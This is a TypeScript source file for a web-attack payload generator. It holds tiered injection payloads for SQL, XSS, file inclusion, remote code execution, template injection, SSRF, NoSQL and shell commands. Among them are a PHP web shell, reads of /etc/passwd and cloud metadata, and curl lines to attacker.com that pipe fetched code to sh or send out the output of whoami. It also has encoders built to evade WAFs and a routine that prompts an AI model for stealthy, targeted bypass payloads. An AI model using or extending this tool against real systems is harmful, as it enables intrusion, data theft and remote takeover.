import { GoogleGenAI } from "@google/genai";

export interface PayloadTier {
  standard: string[];
  advanced: string[];
  elite: string[];
}

export class MutationEngine {
  static mutate(payload: string, type: 'url' | 'double-url' | 'html' | 'hex' | 'unicode'): string {
    switch (type) {
      case 'url': return encodeURIComponent(payload);
      case 'double-url': return encodeURIComponent(encodeURIComponent(payload));
      case 'html': return payload.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
      case 'hex': return payload.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
      case 'unicode': return payload.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
      default: return payload;
    }
  }

  static evasiveWrap(payload: string): string {
    // Advanced evasion: wrap in junk data or common WAF bypass prefixes
    const wrappers = [
      (p: string) => `/*junk*/${p}/*junk*/`,
      (p: string) => `%00${p}%00`,
      (p: string) => `?id=${p}`,
      (p: string) => `{"test":"${p.replace(/"/g, '\\"')}"}`,
      (p: string) => `[${p}]`,
    ];
    const wrapper = wrappers[Math.floor(Math.random() * wrappers.length)];
    return wrapper(payload);
  }
}

export class PayloadOven {
  private static oven: Record<string, PayloadTier> = {
    'SQLi': {
      standard: [
        "' OR '1'='1",
        "admin' --",
        "admin' #",
        "1 OR 1=1",
        "1' OR '1'='1"
      ],
      advanced: [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'); SELECT pg_sleep(5)--",
        "'; SELECT SLEEP(5)--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
      ],
      elite: [
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "0x27204f5220313d31",
        "/*%2a/OR/*%2a/1=1",
        "%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--"
      ]
    },
    'XSS': {
      standard: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)"
      ],
      advanced: [
        "'-alert(1)-'",
        "\";alert(1)//",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">"
      ],
      elite: [
        "<math><mtext><option><annotation><img src=x onerror=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
        "\" onmouseover=\"alert(1)\"",
        "{{constructor.constructor('alert(1)')()}}",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ]
    },
    'LFI': {
      standard: [
        "../../etc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
      ],
      advanced: [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
      ],
      elite: [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "....//....//....//etc/passwd",
        "/etc/passwd%00"
      ]
    },
    'RCE': {
      standard: [
        "$(id)",
        "`id`",
        "| id",
        "; id"
      ],
      advanced: [
        "& id",
        "&& id",
        "|| id",
        "; system('id');"
      ],
      elite: [
        "<?php system($_GET['cmd']); ?>",
        "import os; os.system('id')",
        "eval('id')",
        "exec('id')",
        "$(curl http://attacker.com/`id`|sh)"
      ]
    },
    'SSTI': {
      standard: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>"
      ],
      advanced: [
        "#{7*7}",
        "*{7*7}",
        "{{self}}",
        "{{config}}"
      ],
      elite: [
        "{{request.application.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        "${{7*7}}",
        "[[7*7]]",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
      ]
    },
    'SSRF': {
      standard: [
        "http://127.0.0.1:80",
        "http://localhost:80"
      ],
      advanced: [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:22"
      ],
      elite: [
        "http://127.0.0.1:6379",
        "dict://127.0.0.1:6379/SET:test:test",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0aquit%0d%0a",
        "file:///etc/passwd"
      ]
    },
    'NoSQLi': {
      standard: [
        "{\" $gt \": \"\"}",
        "{\"$ne\": null}"
      ],
      advanced: [
        "admin' || '1'=='1",
        "this.password.length > 0"
      ],
      elite: [
        "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
        "|| 1==1",
        "'; return true; //",
        "{\"$where\": \"this.password.match(/.*/)\"}",
        "{\"$regex\": \".*\"}",
        "admin' && this.password.length > 0 || 'a'=='b",
        "{\"$gt\": \"\"}",
        "{\"$exists\": true}"
      ]
    },
    'Command Injection': {
      standard: [
        "; sleep 5",
        "& sleep 5",
        "| sleep 5"
      ],
      advanced: [
        "`sleep 5`",
        "$(sleep 5)",
        "&& sleep 5"
      ],
      elite: [
        "|| sleep 5",
        "; ping -c 5 127.0.0.1",
        "& ping -c 5 127.0.0.1",
        "; timeout 5 /bin/sh",
        "; {cat,/etc/passwd}",
        "$(cat${IFS}/etc/passwd)",
        "& curl http://attacker.com/$(whoami) &",
        "; python -c 'import os; os.system(\"id\")'",
        "'; java.lang.Runtime.getRuntime().exec(\"id\"); //"
      ]
    }
  };

  static getPayloads(category?: string, layer: 1 | 2 | 3 = 1, count: number = 10, evasive: boolean = false): string[] {
    const layerKey = layer === 1 ? 'standard' : layer === 2 ? 'advanced' : 'elite';
    
    let payloads: string[] = [];
    if (category && this.oven[category]) {
      payloads = this.shuffle(this.oven[category][layerKey]).slice(0, count);
    } else {
      const all = Object.values(this.oven).flatMap(tier => tier[layerKey]);
      payloads = this.shuffle(all).slice(0, count);
    }

    if (evasive) {
      const types: ('url' | 'double-url' | 'html' | 'hex' | 'unicode')[] = ['url', 'double-url', 'html', 'hex', 'unicode'];
      return payloads.map(p => {
        const type = types[Math.floor(Math.random() * types.length)];
        return MutationEngine.evasiveWrap(MutationEngine.mutate(p, type));
      });
    }
    return payloads;
    
    return payloads;
  }

  static getAllCategories(): string[] {
    return Object.keys(this.oven);
  }

  static async generateCustomPayload(ai: GoogleGenAI | null, category: string, context: string): Promise<string> {
    if (!ai) return this.getPayloads(category, 1, 1)[0];

    const prompt = `As an elite security researcher (argila) and red-team strategist, generate a highly specialized, stealthy ${category} payload for the following context:
    Context: ${context}
    
    The payload should be designed to bypass modern WAFs and find the exact security gap.
    If context contains "Discovered Intel", use those usernames or IDs to create targeted, chained exploit attempts.

    Return ONLY the raw payload string, no explanation.`;

    try {
      const res = await ai.models.generateContent({
        model: 'gemini-1.5-pro',
        contents: prompt
      });
      const rawPayload = res.text?.trim() || this.getPayloads(category, 1, 1)[0];

      // Randomly apply an extra layer of mutation to AI generated payloads for maximum evasion
      const mutationTypes: ('url' | 'double-url' | 'html' | 'hex' | 'unicode')[] = ['url', 'double-url', 'html', 'hex', 'unicode'];
      const type = mutationTypes[Math.floor(Math.random() * mutationTypes.length)];
      return Math.random() > 0.5 ? MutationEngine.mutate(rawPayload, type) : rawPayload;
    } catch (e) {
      return this.getPayloads(category, 1, 1)[0];
    }
  }

  private static shuffle(array: string[]): string[] {
    const newArray = [...array];
    for (let i = newArray.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
    }
    return newArray;
  }
}
